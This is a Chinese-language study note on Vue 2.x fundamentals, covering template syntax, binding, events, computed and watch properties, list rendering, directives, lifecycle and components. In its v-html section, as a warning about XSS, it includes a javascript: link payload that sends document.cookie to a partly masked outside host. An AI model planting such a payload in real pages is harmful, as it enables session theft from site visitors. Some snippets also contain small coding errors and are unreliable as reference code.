[表单输入绑定 — Vue.js 中文文档 (bootcss.com)](https://vuejs.bootcss.com/guide/forms.html)

## 使用vue插件

[GitHub - vuejs/devtools: ⚙️ Browser devtools extension for debugging Vue.js applications.](https://github.com/vuejs/devtools)

## 关闭生成环境Tip

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202112191550766.png" alt="image-20211219155006661" style="zoom:80%;" />

> :no_entry: 此笔记适用于`vue 2.x` ！！！

# vue核心

## helloworld

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src=https://cn.vuejs.org/js/vue.js></script>
</head>
<body>
    <div id="main">
        <h2>{{name}}</h2>
    </div>
    <script>
        Vue.config.productionTip = false;
        new Vue({
            el:'#main',
            data:{
                name:'胡梓卓'
            }
        })
    </script>                                                                                                                  
</body>
</html>
```

## 模板语法

### 插值语法

解析标签体内容，可读取data中的所有属性

> 插值表达式{{js表达式}} 也可以写vue实例上所有的
>
> :warning: 一个Vue实例只能接管一个容器
>
> + 如果有多个容器，只对第一个有效
> + 如果有多个实例，只对第一个vue实例生效

### 指令语法

解析标签（标签属性、标签体内容、绑定事件...）

```vue
<div id="main">
        <h2>{{name}}</h2>
        <a v-bind:href="jsInit.url">vuejs文件</a>
        <!-- 简写 -->
        <a :href="jsInit.url">vuejs文件</a>
    </div>
<script>
        Vue.config.productionTip = false;
        new Vue({
            el:'#main',
            data:{
                jsInit:{
                    url:'https://cn.vuejs.org/js/vue.js'
                },
                name:'胡梓卓'
            }
        })
    </script>
```

## 数据绑定

```vue
<!-- 单向数据绑定 -->
        <input type="button" v-bind:value="name">
        <input type="button" :value="name">
        <br>
        <!-- 双向数据绑定 -->
        <input type="button" v-model:value="name">
        <input type="button" v-model="name">
```

> v-bind 数据只能从data流向页面
>
> v-model一般只用于表单元素(input、select)

## el与data的两种写法

```vue
<script>
      Vue.config.productionTip = false;
      const v = new Vue({
        // el:'#main',
        // data:{
        //     jsInit:{
        //         url:'https://cn.vuejs.org/js/vue.js'
        //     },
        //     name:'胡梓卓'
        // }
        data: function () {
          return {
            jsInit: {
              url: "https://cn.vuejs.org/js/vue.js",
            },
            name: "胡梓卓"
          };
        },
      });
      v.$mount("#main");
    </script>
```

## MVVM

> m 模型
>
> v 视图
>
> vm 视图模型 数据绑定 dom监听

## 数据代理

```js
Object.defineProperties
```

```js
let number = 18;
      let person = {
        name: "胡梓卓",
        sex: "男",
      };
      Object.defineProperty(person, 'age', {
        value: 21,
        enumerable: true, //枚举，默认false
        writable: true, //可修改，默认false
        configurable: true, //可删除，默认false

        get: function () {
          return number;
        },
        set(value) {
          number = value;
        }
      });
```

> <u>通过vm对象来代理data对象中的属性的操作（get/set）</u>
>
> **基本原理**：通过Object.defineProperty()把data对象中的所有属性添加到vm上，并添加getter/setter，
>
> 在getter/setter内部去操作

## 事件处理

```vue
使用v-xxx / @xxx 绑定事件
事件的回调函数需要配置在methods中，会绑定在vue实例对象上
普通函数的this指向vue实例对象
@click="demo" @click="demo($event,params,...)" $event会把事件对象传过去
```

```vue
      <!-- 事件处理 -->
      <input type="button" value="点击提示" @click="tip($event)" />
<script>
      Vue.config.productionTip = false;
      const v = new Vue({
        methods: {
          tip(event) {
            console.log(event.target);
          },
        },
      });
    </script>
```

## 事件修饰符

### .prevent

> 阻止默认事件

```vue
<input type="button" value="点击提示" @click.prevent="tip($event)" />
<script>
	new Vue({
        tip(e){
            e.preventDefault();
        }
    });
</script>
```

### .stop

> 阻止事件冒泡

```vue
      <div @click="demo">
        <input type="button" @click.stop="demo($event)"/>
      </div>
<script>
	new Vue({
        demo(e){
            e.stopPropagation();
          }
    });
</script>
```

### .once

> 事件只触发一次

### .capture

> 使用事件的捕获方式,在**捕获阶段**就处理事件

### .self

> 只有event.target是当前操作的元素才触发事件
>
> <u>冒泡触发的target永远都是哪个触发的元素</u>
>
> 只有操作的是谁才触发，可用于阻止冒泡

### .passive

> 事件的默认行为立即执行，无需等待回调函数执行完成
>
> ```vue
> @scroll 页面滚动 先执行滚动条滚动，再执行回调函数
> 	滚动条到底，不会触发
> @whell 鼠标滚轮滚动 先执行回调函数，再执行滚动条滚动
> 	只要滚轮滚动就出触发
> ```

可链式写法 .stop.prevent

## 键盘事件

```vue
@keydown
@keypress
@keyup
(1)
	.enter .13
	.delete 删除键和退格键
	.esc
	.space
	.tab 需要配合@keydown使用，因为按下就切换走了
	.up	上
	.down 下
	.left 左
	.right 右
(2)
	ctrl,alt,shift.win(meta)
	@keyup 系统修饰键 + xxx ,释放xxx后，才触发
	@keydown 正常触发
(3)
keyCode
(4)
key
(5)
<input type="text" value="enter" @keydown.hz="tip($event)" />
<script>
Vue.config.keyCodes = {
    "kebab-case": 179,
    "hz": 13,
};
if(event.key=="Enter"){
      console.log(event.key); //Enter
}
</script>
.caps-lock 切换大小写 两个单词（命令首字母小写，加“-”）

//////////////////////////////////
.ctrl.y 按下ctrl+y
```

## 计算属性

```html
<div id="root">
      <input type="text" name="" id="" v-model:value="v1" />
      <br />
      <input type="text" name="" id="" v-model:value="v2" />
      <div>{{v1}}{{v2}}</div>
      <div>{{fullName()}}</div>
    </div>
<script>
    new Vue({
      el: "#root",
      data: {
        v1: 1,
        v2: 2,
      },
      methods: {
        fullName() {
          return this.v1 + "-" + this.v2;
        },
      },
    });
  </script>
```

计算属性，有缓存

get()

+ 初次读取
+ 所依赖的数据发生变化

```html
<div id="root">
      <input type="text" name="" id="" v-model:value="v1" />
      <br />
      <input type="text" name="" id="" v-model:value="v2" />
      <div>{{full_Name}}</div>
    </div>
<script>
    computed: {
        full_Name: {
          get() {
            console.log("get被调用");
            return this.v1 + "-" + this.v2;
          },
          //vm.full_name='里-斯'
          set(value) {
            let arr = value.split("-");
            this.v1 = arr[0];
            this.v2 = arr[1];
          },
        },
</script>
```

计算属性会出现的vue实例上，即为一个属性，值是计算出来的

#### 简写

> 不考虑修改，只展示

```html
<script>
    computed: /*{
        full_Name:function(){
            console.log("get被调用");
            return this.v1 + "-" + this.v2;
        }*/
        full_name(){
            console.log("get被调用");
            return this.v1 + "-" + this.v2;
        }
  }
</script>
```

## 监视属性

> 监视属性必须存在才能监视
>
> (1) new Vue时传入watch配置
>
> (2) 通过vm.$watch监视

```html
<script>
   const vm = new Vue({
      el: "#main",
      data: {
        flag: false,
      },
      methods: {
        changeWeather() {
          this.flag = !this.flag;
        }
      },
      computed: {
        
      },
       //(1)
      watch: {
        flag: {
          immediate: true, //初始化时加载handler
          handler(newValue, oldValue) {
            console.log("falg被修改了", newValue, oldValue);
          },
        },
      },
    });
    //(2)
    vm.$watch("flag", {
      immediate: true, //初始化时加载handler
      handler(newValue, oldValue) {
        console.log("flag被修改了", newValue, oldValue);
      },
    });
  </script>
```

### 深度监视

> vue中的watch默认不监测对象内部值的改变
>
> 配置`deep:true`可以监测对象内部值改变

```html
<script>
    const vm = new Vue({
      el: "#main",
      data: {
        flag: false,
        number: {
          a: 1,
          b: 2,
        },
      },
      watch: {
        "number": {
          deep:true, //深度监视
          handler(newValue,oldValue) {
            console.log("number里面的a被修改了", newValue, oldValue);
          },
        },
      },
    });
  </script>
```

### 监视简写

> 不需要配置其他属性如immediate,deep时，使用

```js
watch: {
number(newValue,oldValue){
          console.log("number里面的a被修改了", newValue, oldValue);
        }
}
vm.$watch('flag',function(){
      console.log("flag被修改了", newValue, oldValue);
    })
```

## watch与computed的区别

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202112292130387.png" alt="image-20211229213007245" style="zoom:80%;" />



## 绑定class样式

> (1) `字符串`写法，:class(v-bind:class)="字符串" 样式的类名不确认，需要动态指定
>
> (2) `数组`写法，要绑定的样式数量不确定，名字也不确定
>
> ```html
> <div :class="arr"></div>
> data:{
>     arr:['className1','className2']
> }
> ```
>
> (3) `对象`写法，数量，类名相同，动态确定
>
> ```html
> <div :class="obj"></div>
> data:{
> 	obj:{
> 		className1false,
> 		className2true
> 	}
> }
> }
> ```

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202112302227752.png" alt="image-20211230222709222" style="zoom:80%;" />

## 绑定style样式

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202112302227641.png" alt="image-20211230222746668" style="zoom:80%;" />

> :style(v-bind:style)
>
> + 对象写法 :style="{fontSize:xxx}" xxx是动态值
>
> + 数组写法 :style="[a,b]" a,b是<u>样式对象</u>
>
>   **样式对象：**
>
>   <img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202112302226467.png" alt="image-20211230222623754" style="zoom:80%;" />

## 条件渲染

> `v-show`=xxx `display:none`隐藏样式（xxx为布尔值）
>
> `v-if`=xxx 删除结点,**不展示的dom被移除**。适用于切换频率较低的场景
>
> `v-else-if`=xxx
>
> `v-else`=xxx

```vue
<template v-if="i==1">
     <h2>我的</h2>
     <h2>爱</h2>
     <h2>好</h2>
</template>
```

## 列表渲染

> `v-for`
> 展示列表数据
> v-for="(item,index) in xxx" :key="index"
> 可遍历数组，对象，字符串，指定次数

 ```vue
 <ul>
         <li>遍历数组</li>
         <li v-for="(item, value) in arr" :key="value">
             姓名：{{item.sname}}，年龄：{{item.age}}
         </li>
         <li>遍历对象</li>
         <li v-for="(val, name) in object" :key="name">
             {{name}}:{{val}}
         </li>
         <li>遍历字符串</li>
         <li v-for="(element, index) in str" :key="index">
             {{index}}:{{element}}
         </li>
         <li>遍历指定次数</li>
         <li v-for="(number, inx) in 6" :key="inx">
             {{inx}}:{{number}}
         </li>
     </ul>
 ```

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201032147953.png" alt="image-20220103214659565" style="zoom:80%;" />

### key作用与原理

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201032214054.png" alt="image-20220103221441441" style="zoom:80%;" />

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201032218974.png" alt="image-20220103221758075" style="zoom:80%;" />

### key的原理

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201032221122.png" alt="image-20220103222148681" style="zoom:80%;" />

### 列表过滤

> "asdsf" 使用 ""（空字符串）indexOf 返回`0`

```vue
<div id="root">
    <ul>
        <input type="text" placeholder="请输入要查询的数据。。。" v-model="keyWord"/>
        <li v-for="(item,index) in filterPersons">
            姓名：{{item.name}}--性别：{{item.sex}}--年龄：{{item.age}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            persons: [
                {id: '001', name: '马冬梅', sex: '女', age: '18'},
                {id: '002', name: '周冬雨', sex: '女', age: '19'},
                {id: '003', name: '周杰伦', sex: '男', age: '20'},
                {id: '004', name: '温兆伦', sex: '男', age: '21'}
            ],
            filterPersons: []
        },
        method: {},
        watch: {
            keyWord: {
                immediate: true,
                handler(val) {
                    this.filterPersons = this.persons.filter((p) => {
                        return p.name.indexOf(val) !== -1;
                    })
                }
            }
        },
        computed: {
            // filterPersons() {
            //     return this.persons.filter((p) => {
            //         return p.name.indexOf(this.keyWord) !== -1;
            //     })
            // }
        }
    });
</script>
```

### 列表排序

```vue
<div id="root">
    <ul>
        <input type="text" placeholder="请输入要查询的数据。。。" v-model="keyWord"/>
        <input type="button" @click="sortType=0" value="原顺序"/>
        <input type="button" @click="sortType=1" value="升序"/>
        <input type="button" @click="sortType=2" value="降序"/>
        <li v-for="(item,index) in filterPersons">
            姓名：{{item.name}}--性别：{{item.sex}}--年龄：{{item.age}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            sortType: '',
            persons: [
                {id: '001', name: '马冬梅', sex: '女', age: '23'},
                {id: '002', name: '周冬雨', sex: '女', age: '35'},
                {id: '003', name: '周杰伦', sex: '男', age: '34'},
                {id: '004', name: '温兆伦', sex: '男', age: '21'}
            ],
            // filterPersons: []
        },
        method: {},
        watch: {
            // keyWord: {
            //     immediate: true,
            //     handler(val) {
            //         this.filterPersons = this.persons.filter((p) => {
            //             return p.name.indexOf(val) !== -1;
            //         }).sort((a, b) => {
            //
            //         })
            //     }
            // }
        },
        computed: {
            filterPersons() {
                const arr = this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1;
                });
                if (this.sortType !== 0) {
                    arr.sort((o1, o2) => {
                        return this.sortType === 1 ? o1.age - o2.age : o2.age - o1.age;
                    })
                }
                return arr;
            }
        }
    });
</script>
```

## vue检测数据的原理

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201042157082.png" alt="image-20220104215723138" style="zoom:80%;" />

> + vue会监视data中所有层次的数据

### 对象里面的数据改变

通过setter实现监视，且要在new Vue时就传入要检测的数据

1. 对象中后追加的属性，Vue默认不做响应式处理

2. 如果需要后添加的属性为响应式

   ```js
   Vue.set(target,propertyName/index,value)
   vm.$set(target,propertyName/index,value)
   ```

### 数组里面的数据改变

通过包裹数组更新元素的方法实现

1. 调用原生对应的方法对数组进行更新
2. 重新解析模板，进而更新页面

#### 修改数组元素

```js
使用push(),shift(),unshift(),splice(),sort(),reverse()
Vue.set(),vm.$set()
```

> **Vue.set(),vm.$set() 不能给vm或vm的根数据对象添加属性**

## 收集表单数据

```html
<input type="text"> v-model收集value值

<input type="radio">  v-model收集value值

<input type="checkbox">
没有配置value属性，收集的就是checked（布尔值）
配置value属性
（1）v-model的初始值是非数组，收集的就是checked（布尔值）
（2）v-model的初始值是数组，收集的就是value组成的数组
```

### 修饰符

```js
（1）v-model.lazy 失去焦点再收集数据
（2）v-model.number 输入字符串转化为有效的数字，一般配合type="number"使用
使用type="text"输入12df44，收集12
（3）v-model.trim 去除首尾空格
```

## ~~过滤器~~:x:

> :no_entry_sign: 从 Vue 3.0 开始，过滤器已移除，且不再支持

1. 注册过滤器 Vue.filter(name,callback) 或 new Vue{filters:{}}
2. 使用过滤器 {{xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"

+ 可接收额外参数，多个过滤器可串联使用

+ 不改变原始数据

```js
<h2>局部过滤器</h2>
    <h2>现在时间：{{date | fmtDate}}</h2>
    <h2>现在时间：{{date | fmtDate('YYYY年MM月DD日')}}</h2>
    <h2>现在时间：{{date | fmtDate('YYYY年MM月DD日') | strSlice}}</h2>
    <h2 v-bind:data-strSlice="date | strSlice">现在时间：{{date | fmtDate('YYYY年MM月DD日') | strSlice}}</h2>
    <script>
        // 全局过滤器
        Vue.filter('strSlice', function (value) {
                return (value+'').slice(0, 4);
            }
        )
        new Vue({
            el: '#root',
            data: {
                date: Date.now()
            },
            method: {},
            watch: {},
            computed: {},
            filters: {
                fmtDate(value, params = 'YYYY-MM-DD HH:mm:ss') {
                    return dayjs().format(params);
                },
                // strSlice(value) {
                //     return value.slice(0, 4);
                // }
            }
        });
    </script>
```

## 内置指令

### v-text 指令

> 向其所在的节点中**渲染文本内容**
>

与插值语法的区别：v-text会**替换节点中的内容**,{{xx}}不会

### v-html

> 向指定节点中渲染包含**html结构**的内容

安全性问题！！！注意XSS攻击

```html
<a href=javascript:location.href="http://152.??.com?"+document.cookie>XXX</a>
```

`HttpOnly属性`：只能http协议能够携带获取

### v-cloak

> **Vue实例创建完毕并接管容器后，会删除v-cloak属性**
>
> 配置css可解决网速慢页面展示{{xx}}的问题

```html
属性选择器
[v-cloak]{
	display:none
}
<div v-cloak>{{name}}</div>
```

### v-once

> **v-once所在节点在初次动态渲染后，视为静态资源**
>
> 以后数据不会更新

```html
<div v-once>{{n}}</div>
```

### v-pre

> **跳过所在节点的编译过程**
>
> 跳过没有使用指令和插值语法的节点，加快编译

## 自定义指令

### 局部指令

```vue
<span v-big-number="n"></span>
<script>
    directives: {
        		xx(element, binding){},
                xx:function (element, binding){
                  //不包含inserted
                },
                'xx-xx':{
                    //指令与元素成功绑定
                    bind(element,binding){

                    },
                    //指令所在元素被插入页面
                    inserted(element,binding){
						binding.focus();//自动获取焦点
                    },
                    //指令所在模板被重新解析
                    update(element,binding){

                    }
                }
            }
    </script>
```

### 全局指令

```vue
<script>
    Vue.directive('xx-xx',{});
	Vue.directive('xx-xx',function (element,binding){});
</script>
```



<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201102140108.png" alt="image-20220110214027981" style="zoom:80%;" />

什么时候调用此指令？

1. 指令与元素成功绑定
2. 指定所在模板被重新解析

`注意`：

+ 指令定义不加**v-**，使用时加

+ case命名使用kebab-case形式。不能使用camelCase
+ this作用域为`window`

## 生命周期

生命周期函数的this指向**vue实例**或**组件实例对象**

```vue
<script>
    new Vue({
      //vue模板解析完成并把初始的真实DOM元素放入页面后，执行
	mounted(){}  
    })
</script>
```

### `创建-挂载-更新-销毁`流程

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201112215165.png" alt="image-20220111221542241" style="zoom:80%;" />



<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201112150055.png" style="zoom:80%;" />

```vue
vue2.x 模板必须包含一个根节点，vue3.x已解决
<script>
new Vue({
            el: '#root',
            template: `
                 <div>
                  <h2></h2>
                  <div></div>
                 </div>
                `,
</script>
```

> **注意：**
>
> 销毁解绑的是`自定义事件`，绑定的dom事件有效，如click
>
> 执行``beforeDestory`时，**数据发送变化，不会触发页面更新**

```html
两个不同作用域要使用同一个变量，可使用this关键字挂到当前实例上
文字透明度改变a
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Document</title>
    <script src="https://cn.vuejs.org/js/vue.js"></script>
</head>
<body>
<div id="root">
    <h2 v-bind:style="{opacity}">胡梓卓</h2>
    <button @click="stopTime()">点击停止</button>
    <button @click="opacity = 1">点击透明度=1</button>
    <button @click="destoryVue()">销毁vue</button>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            opacity: 1
        },
        methods: {
            destoryVue() {
                this.$destroy();
            },
            stopTime() {
                clearInterval(this.timer);
            }
        },
        watch: {},
        computed: {},
        filters: {},
        directives: {},
        mounted() {
            this.timer = setInterval(() => {
                this.opacity -= 0.01;
                if (this.opacity < 0) {
                    this.opacity = 1;
                }
            }, 16)
        },
        beforeDestroy() {
            console.log("vue实例即将被销毁");
            clearInterval(this.timer);
        }
    });
</script>
</div>
</body>
</html>
```



# vue组件化编程

## 组件

实现局部功能的代码和资源的集合



## 使用组件（非单文件组件）

> 1.定义组件（创建组件）
>
> 2.注册组件
>
> 3.使用组件（写组件标签）

### 定义

使用``Vue.extend(options)``创建，其中options和new Vue(options)时传入的有点区别

 1. **el不写**。最终所有的组件要经过vm的管理，有vm中的el决定哪个容器
 2. **data必须写成函数**。避免组件复用时，数据存在引用关系
 使用template配置组件结构

### 注册

局部注册：new Vue时传入`components`选项

全局注册：使用`Vue.component('组件名','组件')`

### 编写组件标签

```vue
<school></school>
```

```vue
<body>
<div id="root">
    <!--    使用组件-->
    <employee></employee>
    <hr>
    <department></department>
</div>
</body>
<script>
    //定义组件
    const employee = Vue.extend({
        template: `
          <div>
          <h2>{{ name }}</h2>
          <h2>{{ age }}</h2>
          <button @click="showName">点击提示姓名</button>
          </div>
        `,
        data() {
            return {
                name: '胡梓卓',
                age: 18
            }
        },
        methods: {
            showName() {
                alert(this.name);
            }
        }
    });
    const department = Vue.extend({
        template: `
          <div>
          <h2>{{ name }}</h2>
          <h2>{{ numberOfPeople }}</h2>
          <button @click="showName">点击提示部门名称</button>
          </div>
        `,
        data() {
            return {
                name: '智能制造部',
                numberOfPeople: 203
            }
        },
        methods: {
            showName() {
                alert(this.name);
            }
        }
    });
    new Vue({
        el: '#root',
        //注册组件
        components: {
            employee: employee,
            department: department
        },
        data: {},
        method: {},
        computed: {},
        watch: {},
        filters: {},
        directives: {}
    });
</script>
```

<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201122134138.png" alt="image-20220112213414805" style="zoom:80%;" />



## 注意点:warning:

### 组件名

一个单词组成：

​	（首字母小写）：school

​	（首字母大写）：School

多个单词组成：

​	（kebab-case）：my-school

​	（CamelCase）：MySchool

注意：

（1）组件名不要写成html中已有的元素名称

（2）可以使用name配置向指定组件在开发者工具中呈现的名字(第三方组件库)



### 组件标签

```vue
<school></school>
<school/>
```

不能使用脚手架时，`<school/>`会导致后续组件不能渲染

### 声明组件简写

```vue
const school = Vue.extend({options}) => const school = {options}
```

